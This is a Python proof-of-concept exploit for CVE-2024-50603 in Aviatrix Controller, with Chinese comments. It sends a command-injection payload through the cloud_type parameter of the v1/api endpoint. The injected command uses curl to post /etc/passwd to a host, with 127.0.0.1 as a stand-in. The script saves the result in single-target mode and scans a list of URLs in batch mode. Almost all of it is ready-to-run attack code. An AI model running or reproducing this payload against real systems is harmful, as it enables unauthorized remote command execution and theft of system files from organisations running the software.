"""
-*- coding: utf-8 -*-
@Project : CVE-2024-50603
@Version : Aviatrix Controller 7.x through 7.2.4820
@Author  : wodelilian
@Date    : 2025/3/7 18:19
Software : PyCharm
version  : Python 3.10
@File    : CVE-2024-50603.py
"""
import re
import requests
import argparse

urlpath = 'v1/api'
payload1 = 'cloud_type=1|$(curl+-X+POST+-F+"file=@/etc/passwd"+http://127.0.0.1)'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'
}


def checktarget(pattern, url):
    """
    :param pattern: 漏扫模式：单独/批量
    :param url: 目标URL
    :return:
    """
    if str(pattern) == 'alone':
        if str(url[-1]) != "/":
            url = url + "/" + urlpath
        else:
            pass
        try:
            response = requests.post(url=url, data=payload1, headers=headers, verify=False)
            state = response.status_code
            if state == 200:
                print('响应成功，目标地址可能存在漏洞，尝试获取更多配置文件信息\n')
                responseinfo = re.findall(r'daemon', response.text)
                if len(responseinfo) != 0:
                    f = open('etcpasswd.txt', 'w')
                    f.write(response.text)
                    f.close()
                    print("数据已写入当前路径下etcpasswd.txt中，请注意查看")
                else:
                    print("当前IP执行失败，可能不存在该漏洞！")
        except Exception as e:
            print(e)
            print('当前IP执行失败，可能不存在该漏洞！')
    else:
        list = openfile(url)
        try:
            for i in list:
                if str(i[-1]) != "/":
                    url = i + "/" + urlpath
                    batch(url)
                else:
                    batch(i)
        except Exception as e:
            print(e)

def batch(url):
    response = requests.post(url=url, data=payload1, headers=headers, verify=False)
    state = response.status_code
    if state == 200:
        responseinfo = re.findall(r'daemon', response.text)
        if len(responseinfo) != 0:
            print('当前URL可能存在漏洞，请手动核实：' + url)
        else:
            print("当前URL不存在漏洞，pass")
    else:
        print("当前URL不存在漏洞，pass")

def openfile(filepath):
    """
    :param filepath: 传入读取文件地址
    :return: 返回文件中的URL
    """
    urllist = []  # 定义一个空列表用来返回URL
    with open(filepath) as f:
        for url in f.readlines():
            url = url.replace("\n", "")
            if url != "":
                urllist.append(url)
    return urllist


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='python3 CVE-2024-50603.py -r [Pattern(alone list)] -u [IP Address] ',
        epilog='python3 -r alone -u http://127.0.0.1 ')
    parser.add_argument('-r', '--run',  help='Pattern(alone list)')
    parser.add_argument('-u', '--url',  help='Destination IP address or IP filepath')
    args = parser.parse_args()
    pattern = args.run
    url = args.url
    print(
        f"Author: Wodelilian\n"
    )
    checktarget(pattern, url)
